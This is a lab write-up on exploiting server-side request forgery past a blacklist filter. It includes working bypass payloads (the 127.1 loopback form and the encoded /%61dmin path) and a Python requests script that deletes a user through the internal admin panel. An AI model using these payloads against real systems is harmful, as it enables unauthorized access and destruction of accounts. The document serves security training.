# Lab 4: SSRF with Blacklist-Based Input Filter

## Objective

The goal of this lab was to exploit an SSRF vulnerability in the stock check functionality while bypassing two weak anti-SSRF protections.

The target was the internal admin interface at `http://localhost/admin`. I needed to bypass the input filters and delete the user `carlos`.

## Analysis

1. **Identifying the restrictions**

   The application normally allows the stock check feature to fetch a user-supplied URL. However, the developer introduced blacklist-based filtering to block access to internal resources.

   The filters restrict certain localhost representations and the `/admin` path.

2. **Bypassing the localhost restriction**

   Instead of using `localhost` or `127.0.0.1`, I used:

   ```text
   http://127.1/
   ```

   `127.1` is an alternative representation of the loopback address `127.0.0.1`.

   This can bypass filters that only check for the exact strings `localhost` or `127.0.0.1`.

3. **Bypassing the admin path restriction**

   The application also blocks requests containing the `/admin` path.

   I used URL encoding to represent the letter `a`:

   ```text
   /%61dmin
   ```

   The server or URL parser decodes `%61` into `a`, resulting in the actual path:

   ```text
   /admin
   ```

   This bypasses a filter that checks for the literal `/admin` string without properly normalizing the URL first.

4. **Combining both bypasses**

   Combined the alternative loopback address and encoded path:

   ```text
   http://127.1/%61dmin
   ```

   This allowed the request to reach the internal admin interface despite the blacklist restrictions.

## Exploitation

I automated the attack using Python and the `requests` library.

**1. Deleting the user**

The script first sends the deletion request through the stock check endpoint:

```python id="f8k2vx"
params = {
    'stockApi': 'http://127.1/%61dmin/delete?username=carlos'
}

r = requests.post(
    url + stockCheck,
    proxies=proxies,
    verify=False,
    data=params
)
```

**2. Checking the admin interface**

The script then requests the admin page using the same bypass:

```python id="n3j5qw"
params2 = {
    'stockApi': 'http://127.1/%61dmin'
}

r = requests.post(
    url + stockCheck,
    proxies=proxies,
    verify=False,
    data=params2
)
```

## Result

Successfully solved the lab by bypassing both blacklist restrictions and accessing the internal admin interface.

The attack worked because the application relied on string-based filtering instead of validating the normalized destination IP address and URL path.